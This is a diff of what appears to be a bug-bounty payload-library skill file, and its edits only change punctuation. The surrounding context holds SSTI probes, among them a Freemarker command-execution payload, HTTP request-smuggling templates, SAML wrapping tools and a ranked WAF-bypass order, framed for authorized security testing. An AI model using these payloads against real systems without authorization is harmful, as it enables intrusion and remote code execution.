@@ -11,7 +11,7 @@ ${7*7}         → 49 = Freemarker (Java) or Spring EL
 <%= 7*7 %>     → 49 = ERB (Ruby) or EJS (Node.js)
 #{7*7}         → 49 = Mako (Python) or Pebble (Java)
 *{7*7}         → 49 = Spring Thymeleaf
-{{7*'7'}}      → 7777777 = Jinja2 (not Twig; Twig gives 49)
+{{7*'7'}}      → 7777777 = Jinja2 (not Twig — Twig gives 49)
 ${"freemarker.template.utility.Execute"?new()("id")}  → Freemarker RCE
 ```
 
@@ -66,7 +66,7 @@ HTTP headers that appear in rendered responses, notification templates
 
 ## HTTP SMUGGLING PAYLOADS
 
-### CL.TE: Content-Length front-end, Transfer-Encoding back-end
+### CL.TE — Content-Length front-end, Transfer-Encoding back-end
 ```http
 POST / HTTP/1.1
 Host: target.com
@@ -78,7 +78,7 @@ Transfer-Encoding: chunked
 SMUGGLED
 ```
 
-### TE.CL: Transfer-Encoding front-end, Content-Length back-end
+### TE.CL — Transfer-Encoding front-end, Content-Length back-end
 ```http
 POST / HTTP/1.1
 Host: target.com
@@ -92,7 +92,7 @@ SMUGGLED
 
 ```
 
-### TE.TE: Both support Transfer-Encoding, obfuscate to disable one
+### TE.TE — Both support Transfer-Encoding, obfuscate to disable one
 ```http
 # Obfuscate the TE header so one layer ignores it
 Transfer-Encoding: xchunked
@@ -107,7 +107,7 @@ Transfer-Encoding
 : chunked
 ```
 
-### H2.CL: HTTP/2 front-end with Content-Length injection
+### H2.CL — HTTP/2 front-end with Content-Length injection
 ```
 # In Burp Repeater, switch to HTTP/2
 # Add Content-Length header manually (not auto-set by HTTP/2)
@@ -308,7 +308,7 @@ asyncio.run(race())
 
 ### Tools
 ```bash
-# SAMLRaider (Burp extension): most automated XSW testing
+# SAMLRaider (Burp extension) — most automated XSW testing
 # Install from BApp Store, intercept SAMLResponse, right-click → SAML Raider
 
 # Manual: decode, modify, re-encode
@@ -370,14 +370,14 @@ Mixed content (HTTP resources on HTTPS page)
 SSL weak cipher suites
 Missing HttpOnly / Secure cookie flags alone
 Broken external links
-Pre-account takeover (usually; requires very specific conditions)
+Pre-account takeover (usually — requires very specific conditions)
 Autocomplete on password fields
 ```
 
 ---
 
 
-## POTENTIAL CHAINS: VERIFY PREREQUISITES
+## POTENTIAL CHAINS — VERIFY PREREQUISITES
 
 These are valid ONLY when combined with a chain that proves real impact:
 
@@ -455,11 +455,11 @@ sensitive.txt      # Sensitive paths (.env, config.json, backup, etc.)
 
 ## Related Skills & Chains
 
-- **`hunt-xss`** / **`hunt-ssrf`** / **`hunt-sqli`** / **`hunt-ssti`** / **`hunt-idor`**; When a hunter is actively testing a parameter and needs payloads. Workflow primitive: this skill is the payload library those hunt-* skills reach for; the hunt-* skill identifies the sink, this skill provides the syntax.
-- **`triage-validation`**; When deciding if a finding is reportable at all. Workflow primitive: the "Always Rejected" and "Conditionally Valid; Requires Chain" tables in both skills must agree; `triage-validation` runs the 7-Question Gate, this skill provides the chain-required mapping used by Q7.
-- **`web2-recon`**; When the URL set has been classified by `gf` patterns. Workflow primitive: `gf xss/ssrf/sqli` outputs from recon → look up the corresponding payload section here; `gf` pattern names index directly into this skill's payload sections.
-- **`evidence-hygiene`**; When a payload produces output worth screenshotting. Workflow primitive: after a payload demonstrates impact (cookie theft, data exfil), hand off to `evidence-hygiene` for redaction before the screenshot becomes evidence.
-- **`bb-methodology`**; When Phase 3 (Discovery) routes by input type. Workflow primitive: Phase 3's decision flow ("ID param → IDOR checklist", "URL input → SSRF checklist") names which section of this arsenal to load.
+- **`hunt-xss`** / **`hunt-ssrf`** / **`hunt-sqli`** / **`hunt-ssti`** / **`hunt-idor`** — When a hunter is actively testing a parameter and needs payloads. Workflow primitive: this skill is the payload library those hunt-* skills reach for; the hunt-* skill identifies the sink, this skill provides the syntax.
+- **`triage-validation`** — When deciding if a finding is reportable at all. Workflow primitive: the "Always Rejected" and "Conditionally Valid — Requires Chain" tables in both skills must agree; `triage-validation` runs the 7-Question Gate, this skill provides the chain-required mapping used by Q7.
+- **`web2-recon`** — When the URL set has been classified by `gf` patterns. Workflow primitive: `gf xss/ssrf/sqli` outputs from recon → look up the corresponding payload section here; `gf` pattern names index directly into this skill's payload sections.
+- **`evidence-hygiene`** — When a payload produces output worth screenshotting. Workflow primitive: after a payload demonstrates impact (cookie theft, data exfil), hand off to `evidence-hygiene` for redaction before the screenshot becomes evidence.
+- **`bb-methodology`** — When Phase 3 (Discovery) routes by input type. Workflow primitive: Phase 3's decision flow ("ID param → IDOR checklist", "URL input → SSRF checklist") names which section of this arsenal to load.
 
 ---
 
@@ -479,12 +479,12 @@ Imported product/version and browser claims are not a compatibility matrix. Beha
 
 When multiple bypass payloads exist for the same WAF, the order to try is:
 
-1. **Encoding tricks**; case variation (`SeLeCt`), URL-encode once, URL-encode twice, Unicode escape (`<`), HTML-entity (`&#x3c;`), UTF-8 overlong sequences.
-2. **Parser quirks**; XML namespace, JSON `\u` escapes mid-keyword, `Content-Type: application/json` vs `application/x-www-form-urlencoded` parser-confusion, multipart boundary tricks.
-3. **Protocol-level**; HTTP/2 vs HTTP/1.1 (some WAFs only inspect one), Host header injection, `X-Original-URL`, `X-Forwarded-*` smuggling.
-4. **WAF rule-specific bypasses**; Cloudflare, AWS WAF, Akamai, Imperva, F5 ASM each have known signature gaps; load the vendor-specific payload subsection.
+1. **Encoding tricks** — case variation (`SeLeCt`), URL-encode once, URL-encode twice, Unicode escape (`<`), HTML-entity (`&#x3c;`), UTF-8 overlong sequences.
+2. **Parser quirks** — XML namespace, JSON `\u` escapes mid-keyword, `Content-Type: application/json` vs `application/x-www-form-urlencoded` parser-confusion, multipart boundary tricks.
+3. **Protocol-level** — HTTP/2 vs HTTP/1.1 (some WAFs only inspect one), Host header injection, `X-Original-URL`, `X-Forwarded-*` smuggling.
+4. **WAF rule-specific bypasses** — Cloudflare, AWS WAF, Akamai, Imperva, F5 ASM each have known signature gaps; load the vendor-specific payload subsection.
 
-Most engagements end at step 2; modern WAFs trip on the parser-quirk class because the WAF and the origin app disagree on what's a "valid" request.
+Most engagements end at step 2 — modern WAFs trip on the parser-quirk class because the WAF and the origin app disagree on what's a "valid" request.
 
 ### OOB-Or-It-Didn't-Happen Gate applies everywhere
 
@@ -492,15 +492,15 @@ OOB is one possible validation method, not mandatory for every blind issue. Timi
 
 ### Marker discipline
 
-Generic words appear naturally in target content. A search for `javascript` hitting "JavaScript Tutorial" is not reflection; it's keyword overlap. Use unique random strings:
+Generic words appear naturally in target content. A search for `javascript` hitting "JavaScript Tutorial" is not reflection — it's keyword overlap. Use unique random strings:
 
 ```
 m=$(head -c 12 /dev/urandom | base64 | tr -d '+/=' | head -c 12)
-# now m is like "K7gXq2pNRm1z": search for THIS in the response
+# now m is like "K7gXq2pNRm1z" — search for THIS in the response
 curl "https://target/search?q=${m}" | grep -c "$m"
 ```
 
-If the marker appears in the response, you have reflection. If it appears unescaped in HTML context, you have XSS potential. If it appears in a Location header, redirect. If it appears in a SQL error, injection. The marker is the single source of truth; generic keywords lie.
+If the marker appears in the response, you have reflection. If it appears unescaped in HTML context, you have XSS potential. If it appears in a Location header, redirect. If it appears in a SQL error, injection. The marker is the single source of truth — generic keywords lie.
 
 ### Statistical Sampling for noisy oracles
 
@@ -518,5 +518,5 @@ def welch_t(a, b):
 # interleave control + test trials, n=10 each, t > 3 = signal
 ```
 
-Same rule applies to blind boolean oracles where the diff is response-length or status-code under jitter; sample, don't assume.
+Same rule applies to blind boolean oracles where the diff is response-length or status-code under jitter — sample, don't assume.
 
